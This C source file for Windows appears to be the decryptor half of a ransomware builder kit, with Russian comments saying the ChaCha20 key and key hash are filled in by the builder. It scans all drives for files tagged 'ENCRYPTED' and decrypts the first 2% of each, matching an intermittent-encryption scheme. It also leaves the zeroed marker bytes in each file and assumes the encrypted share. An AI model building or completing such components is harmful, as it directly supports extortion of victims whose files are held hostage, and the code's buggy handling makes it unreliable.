#include <windows.h>
#include "crypto.h"
#include "utils.h"

static BYTE chacha_key[32] = {0}; // Заполняется билдером
static BYTE nonce[12] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01};
static BYTE key_hash[32]; // Заполняется билдером

void decrypt_file(const char* path) {
    HANDLE hFile = CreateFileA(path, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;

    LARGE_INTEGER fileSize;
    GetFileSizeEx(hFile, &fileSize);
    if (fileSize.QuadPart < 16) { CloseHandle(hFile); return; }

    BYTE footer[16];
    SetFilePointer(hFile, -16, NULL, FILE_END);
    DWORD read;
    ReadFile(hFile, footer, 16, &read, NULL);
    if (memcmp(footer, "ENCRYPTED", 9) != 0) { CloseHandle(hFile); return; }

    BYTE* buffer = HeapAlloc(GetProcessHeap(), 0, fileSize.QuadPart);
    SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
    ReadFile(hFile, buffer, fileSize.QuadPart, &read, NULL);

    // Проверка хеша ключа
    BYTE computed_hash[32];
    sha256_hash(chacha_key, sizeof(chacha_key), computed_hash);
    if (memcmp(computed_hash, key_hash, 32) != 0) {
        HeapFree(GetProcessHeap(), 0, buffer);
        CloseHandle(hFile);
        return;
    }

    // Предполагаем, что шифровалось 2% (для простоты)
    size_t decrypt_size = (size_t)(fileSize.QuadPart * 0.02f);
    chacha20_decrypt(buffer, buffer, decrypt_size, chacha_key, nonce);
    memset(buffer + fileSize.QuadPart - 16, 0, 16); // Удаляем метку

    SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
    WriteFile(hFile, buffer, fileSize.QuadPart, &read, NULL);
    HeapFree(GetProcessHeap(), 0, buffer);
    CloseHandle(hFile);
}

void scan_directory(const char* dir) {
    char search[MAX_PATH];
    sprintf_s(search, sizeof(search), "%s\\*.*", dir);
    WIN32_FIND_DATAA fd;
    HANDLE hFind = FindFirstFileA(search, &fd);
    if (hFind == INVALID_HANDLE_VALUE) return;

    do {
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            if (strcmp(fd.cFileName, ".") != 0 && strcmp(fd.cFileName, "..") != 0) {
                char subdir[MAX_PATH];
                sprintf_s(subdir, sizeof(subdir), "%s\\%s", dir, fd.cFileName);
                scan_directory(subdir);
            }
        } else {
            char filepath[MAX_PATH];
            sprintf_s(filepath, sizeof(filepath), "%s\\%s", dir, fd.cFileName);
            decrypt_file(filepath);
        }
    } while (FindNextFileA(hFind, &fd));
    FindClose(hFind);
}

int main(int argc, char* argv[]) {
    if (argc > 1 && strcmp(argv[1], "-path") == 0 && argc > 2) {
        scan_directory(argv[2]);
    } else {
        char drive[4] = "C:\\";
        for (char c = 'A'; c <= 'Z'; c++) {
            drive[0] = c;
            if (GetDriveTypeA(drive) != DRIVE_NO_ROOT_DIR) scan_directory(drive);
        }
    }
    secure_zero(chacha_key, sizeof(chacha_key));
    return 0;
}